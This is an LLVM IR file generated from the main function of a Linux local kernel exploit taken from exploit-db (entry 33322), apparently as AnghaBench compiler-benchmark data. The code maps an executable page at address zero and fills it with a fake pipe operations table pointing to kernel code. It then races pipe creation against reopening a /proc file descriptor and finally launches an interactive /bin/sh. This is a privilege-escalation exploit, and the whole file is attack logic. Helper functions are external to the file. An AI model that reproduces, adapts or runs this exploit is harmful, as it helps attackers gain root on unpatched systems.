; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33322.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33322.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.pseudo_pipe_inode_info = type { %struct.TYPE_2__*, i64, i64 }
%struct.TYPE_2__ = type { %struct.pipe_buf_operations* }
%struct.pipe_buf_operations = type { i32** }

@PROT_READ = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [9 x i8] c"buf: %p\0A\00", align 1
@kernel_code = common dso_local global i64 0, align 8
@PIPE_BUFFERS = common dso_local global i32 0, align 4
@uid = common dso_local global i32 0, align 4
@gid = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"fork\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"/proc/%d/fd/4\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"Parent: %d\0AChild: %d\0A\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-i\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2 x i32], align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.pseudo_pipe_inode_info*, align 8
  %13 = alloca %struct.pipe_buf_operations, align 8
  %14 = alloca [1024 x i8], align 16
  %15 = alloca i8, align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = call i32 (...) @getpid()
  store i32 %16, i32* %8, align 4
  store %struct.pseudo_pipe_inode_info* null, %struct.pseudo_pipe_inode_info** %12, align 8
  %17 = load i32, i32* @PROT_READ, align 4
  %18 = load i32, i32* @PROT_EXEC, align 4
  %19 = or i32 %17, %18
  %20 = load i32, i32* @PROT_WRITE, align 4
  %21 = or i32 %19, %20
  %22 = load i32, i32* @MAP_PRIVATE, align 4
  %23 = load i32, i32* @MAP_FIXED, align 4
  %24 = or i32 %22, %23
  %25 = load i32, i32* @MAP_ANONYMOUS, align 4
  %26 = or i32 %24, %25
  %27 = call i8* @mmap(i32 0, i32 4096, i32 %21, i32 %26, i32 0, i32 0)
  store i8* %27, i8** %9, align 8
  %28 = load i8*, i8** %9, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i8* %28)
  %30 = load %struct.pseudo_pipe_inode_info*, %struct.pseudo_pipe_inode_info** %12, align 8
  %31 = getelementptr inbounds %struct.pseudo_pipe_inode_info, %struct.pseudo_pipe_inode_info* %30, i32 0, i32 2
  store i64 0, i64* %31, align 8
  %32 = load %struct.pseudo_pipe_inode_info*, %struct.pseudo_pipe_inode_info** %12, align 8
  %33 = getelementptr inbounds %struct.pseudo_pipe_inode_info, %struct.pseudo_pipe_inode_info* %32, i32 0, i32 1
  store i64 0, i64* %33, align 8
  store i32 0, i32* %10, align 4
  br label %34

34:                                               ; preds = %45, %2
  %35 = load i32, i32* %10, align 4
  %36 = icmp slt i32 %35, 10
  br i1 %36, label %37, label %48

37:                                               ; preds = %34
  %38 = load i64, i64* @kernel_code, align 8
  %39 = inttoptr i64 %38 to i32*
  %40 = getelementptr inbounds %struct.pipe_buf_operations, %struct.pipe_buf_operations* %13, i32 0, i32 0
  %41 = load i32**, i32*** %40, align 8
  %42 = load i32, i32* %10, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i32*, i32** %41, i64 %43
  store i32* %39, i32** %44, align 8
  br label %45

45:                                               ; preds = %37
  %46 = load i32, i32* %10, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %10, align 4
  br label %34

48:                                               ; preds = %34
  store i32 0, i32* %10, align 4
  br label %49

49:                                               ; preds = %61, %48
  %50 = load i32, i32* %10, align 4
  %51 = load i32, i32* @PIPE_BUFFERS, align 4
  %52 = icmp slt i32 %50, %51
  br i1 %52, label %53, label %64

53:                                               ; preds = %49
  %54 = load %struct.pseudo_pipe_inode_info*, %struct.pseudo_pipe_inode_info** %12, align 8
  %55 = getelementptr inbounds %struct.pseudo_pipe_inode_info, %struct.pseudo_pipe_inode_info* %54, i32 0, i32 0
  %56 = load %struct.TYPE_2__*, %struct.TYPE_2__** %55, align 8
  %57 = load i32, i32* %10, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %56, i64 %58
  %60 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %59, i32 0, i32 0
  store %struct.pipe_buf_operations* %13, %struct.pipe_buf_operations** %60, align 8
  br label %61

61:                                               ; preds = %53
  %62 = load i32, i32* %10, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %10, align 4
  br label %49

64:                                               ; preds = %49
  store i32 0, i32* %10, align 4
  %65 = call i32 (...) @getuid()
  store i32 %65, i32* @uid, align 4
  %66 = call i32 (...) @getgid()
  store i32 %66, i32* @gid, align 4
  %67 = load i32, i32* @uid, align 4
  %68 = load i32, i32* @uid, align 4
  %69 = load i32, i32* @uid, align 4
  %70 = call i32 @setresuid(i32 %67, i32 %68, i32 %69)
  %71 = load i32, i32* @gid, align 4
  %72 = load i32, i32* @gid, align 4
  %73 = load i32, i32* @gid, align 4
  %74 = call i32 @setresgid(i32 %71, i32 %72, i32 %73)
  %75 = call i32 (...) @fork()
  store i32 %75, i32* %7, align 4
  %76 = load i32, i32* %7, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %80

78:                                               ; preds = %64
  %79 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %126

80:                                               ; preds = %64
  %81 = load i32, i32* %7, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %83, label %109

83:                                               ; preds = %80
  %84 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %85 = load i32, i32* %7, align 4
  %86 = call i32 @sprintf(i8* %84, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0), i32 %85)
  %87 = load i32, i32* %8, align 4
  %88 = load i32, i32* %7, align 4
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i32 %87, i32 %88)
  br label %90

90:                                               ; preds = %106, %83
  %91 = call i32 @is_done(i32 0)
  %92 = icmp ne i32 %91, 0
  %93 = xor i1 %92, true
  br i1 %93, label %94, label %107

94:                                               ; preds = %90
  %95 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %96 = load i32, i32* @O_RDWR, align 4
  %97 = call i32 @open(i8* %95, i32 %96)
  %98 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  store i32 %97, i32* %98, align 4
  %99 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %100 = load i32, i32* %99, align 4
  %101 = icmp ne i32 %100, -1
  br i1 %101, label %102, label %106

102:                                              ; preds = %94
  %103 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %104 = load i32, i32* %103, align 4
  %105 = call i32 @close(i32 %104)
  br label %106

106:                                              ; preds = %102, %94
  br label %90

107:                                              ; preds = %90
  %108 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32* null)
  store i32 0, i32* %3, align 4
  br label %126

109:                                              ; preds = %80
  br label %110

110:                                              ; preds = %125, %109
  %111 = call i32 @is_done(i32 0)
  %112 = icmp ne i32 %111, 0
  %113 = xor i1 %112, true
  br i1 %113, label %114, label %126

114:                                              ; preds = %110
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %116 = call i32 @pipe(i32* %115)
  %117 = icmp ne i32 %116, -1
  br i1 %117, label %118, label %125

118:                                              ; preds = %114
  %119 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %120 = load i32, i32* %119, align 4
  %121 = call i32 @close(i32 %120)
  %122 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %123 = load i32, i32* %122, align 4
  %124 = call i32 @close(i32 %123)
  br label %125

125:                                              ; preds = %118, %114
  br label %110

126:                                              ; preds = %78, %107, %110
  %127 = load i32, i32* %3, align 4
  ret i32 %127
}

declare dso_local i32 @getpid(...) #1

declare dso_local i8* @mmap(i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @getgid(...) #1

declare dso_local i32 @setresuid(i32, i32, i32) #1

declare dso_local i32 @setresgid(i32, i32, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @is_done(i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

declare dso_local i32 @pipe(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
